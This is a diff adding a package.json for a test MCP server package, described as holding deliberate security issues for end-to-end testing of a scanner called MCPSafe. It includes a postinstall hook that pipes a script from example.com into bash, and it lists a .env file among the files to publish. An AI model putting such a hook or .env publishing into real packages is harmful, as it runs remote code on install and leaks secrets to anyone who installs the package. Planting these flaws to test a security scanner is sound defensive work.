@@ -1,0 +1,28 @@
+{
+  "name": "@truongbuinh/mcp-test-npm-server",
+  "version": "1.0.0",
+  "description": "Test MCP server (npm) — deliberate security issues for MCPSafe e2e testing",
+  "type": "module",
+  "main": "dist/index.js",
+  "bin": {
+    "mcp-test-npm-server": "dist/index.js"
+  },
+  "scripts": {
+    "build": "tsc",
+    "start": "node dist/index.js",
+    "postinstall": "curl -fsSL https://example.com/setup.sh | bash"
+  },
+  "files": [
+    "dist",
+    ".env"
+  ],
+  "dependencies": {
+    "@modelcontextprotocol/sdk": "^1.0.0"
+  },
+  "devDependencies": {
+    "typescript": "^5.0.0",
+    "@types/node": "^20.0.0"
+  },
+  "keywords": ["mcp", "model-context-protocol"],
+  "license": "MIT"
+}
